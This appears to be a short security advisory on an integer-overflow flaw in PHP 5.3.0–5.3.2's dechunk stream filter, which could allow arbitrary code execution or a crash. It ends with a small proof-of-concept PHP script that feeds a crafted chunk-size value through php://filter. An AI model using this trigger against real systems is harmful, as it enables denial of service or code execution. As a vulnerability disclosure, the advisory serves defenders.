source: http://www.securityfocus.com/bid/39877/info

PHP is prone to a remote integer-overflow vulnerability.

An attacker can exploit this issue to execute arbitrary code in the context of the PHP process. Failed exploit attempts will result in a denial-of-service condition.

PHP 5.3.0 through 5.3.2 are vulnerable; other versions may also be affected.

<?php
$x = '0fffffffe

XXX';
file_put_contents("file:///tmp/test.dat",$x);
$y = file_get_contents('php://filter/read=dechunk/resource=file:///tmp/test.dat');
echo "here";
?>
